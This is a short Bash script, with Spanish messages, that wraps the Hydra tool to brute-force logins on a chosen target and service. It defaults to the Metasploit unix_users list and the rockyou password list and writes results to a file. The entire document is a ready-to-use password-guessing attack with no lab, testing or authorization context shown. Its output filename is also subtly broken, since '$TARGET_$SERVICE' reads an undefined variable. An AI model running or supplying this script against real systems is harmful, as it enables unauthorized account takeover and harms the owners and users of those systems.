#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <target> <service> <userlist> <passlist>"
    exit 1
fi

TARGET=$1
SERVICE=$2
USERLIST=${3:-"/usr/share/wordlists/metasploit/unix_users.txt"}
PASSLIST=${4:-"/usr/share/wordlists/rockyou.txt"}

echo "Iniciando ataque Hydra en $TARGET con servicio $SERVICE"
hydra -L $USERLIST -P $PASSLIST $TARGET $SERVICE -o hydra_attack_$TARGET_$SERVICE.txt

echo "Ataque Hydra completado. Resultados guardados en hydra_attack_$TARGET_$SERVICE.txt"
